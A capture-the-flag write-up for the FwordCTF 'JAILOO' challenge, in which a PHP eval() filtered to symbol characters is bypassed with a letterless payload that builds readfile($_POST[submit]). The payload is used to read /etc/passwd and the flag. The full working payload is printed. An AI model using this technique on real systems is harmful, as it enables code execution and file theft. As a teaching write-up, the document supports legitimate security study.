JAILOO WARMUP

# Writeup JAILOO from fword ctf

We have the source of a php file that allow us execute commands via php eval(), the problem is there is a regex that only allow a few characters:
```
if(preg_match_all('/^(\$|\(|\)|\_|\[|\]|\=|\;|\+|\"|\.)*$/', $cmd, $matches)){
	echo "<div class=\"success\">Command executed !</div>";
	eval($cmd);
```
This basically means that we need to create a payload without using letters or numbers, just with ``&"+=()[]``
So lets go I have created a script that convert strings to that characters using the idea of getting an A and a from a php object like Array. We can get the A from 0 index and a from index 3.
With that I started with SYSTEM:
![f6d453f66866661cfea748c00e914fb6.png](/_resources/a515719da83441db93350317ca1a10bf.png)
But apparently it was not enabled y tried with asset, but it was disabled too.

So I end up using readfile(). As the server requires only 2 arguments I reused the submit variable to send the file I want to read. This means we need a payload like ``readfile($_POST[submit])``.
So lets create the payload I started with readfile:
![75dd983c25fd8db3c5d73810646ce083.png](/_resources/9627fd6e073e4d7cb6ecd9ba7c6bc5ab.png)
now _POST :
![19eb173e5e67667992ef9881d061e3b9.png](/_resources/4d06f3ebf6db44acbde7ac121d854f2e.png)

And finally submit:
![f9c66e3add3af3f9ce8bc6a4321daa4e.png](/_resources/e54ea12e4c52488890b4b569621437bb.png)

Adding alltogether we get our finnal pyaload:
```
$_="".[];$_=$_[""];$__=("+"=="+");$__=$__+$__+$__;$____="".[];$___=$____[$__];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____=$__;$__=$_;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$____.=$__;$__=$_;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$____.=$__;$______=$____;$_="".[];$_=$_[""];$__=("+"=="+");$__=$__+$__+$__;$____="".[];$___=$____[$__];$__=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____=$__;$__=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$___;$__++;$____.=$__;$__=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_______=$____;$_____="_";$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__;$_=$$_____;$______($_[$_______]);
```
We just need to go and try the files we want to read using the POST parameter submit

trying with /etc/passwd:

![14897da3858336a65ed21ef670b184b6.png](/_resources/4f7d730bae1b450bbb4e5d05c5d66737.png)
Getting the flag:

![6e1118665f791a0eb24657b6f446faba.png](/_resources/e46d23c3bc7a4d24aded3789fe054d95.png)
